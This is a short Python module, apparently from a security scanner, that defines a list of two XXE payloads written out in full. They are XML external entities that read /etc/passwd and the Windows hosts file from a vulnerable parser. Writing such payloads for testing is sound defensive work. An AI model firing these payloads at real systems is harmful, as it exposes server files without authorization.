"""Пейлоады XXE: исходные наборы и порядок проверок сохранены."""

from typing import Final

# Отступы и переводы строк внутри XML сохранены побайтно.


XXE_PAYLOADS: Final[list[str]] = [
    """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
            <foo>&xxe;</foo>""",
    """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///windows/system32/drivers/etc/hosts" >]>
            <foo>&xxe;</foo>""",
]


__all__ = ["XXE_PAYLOADS"]
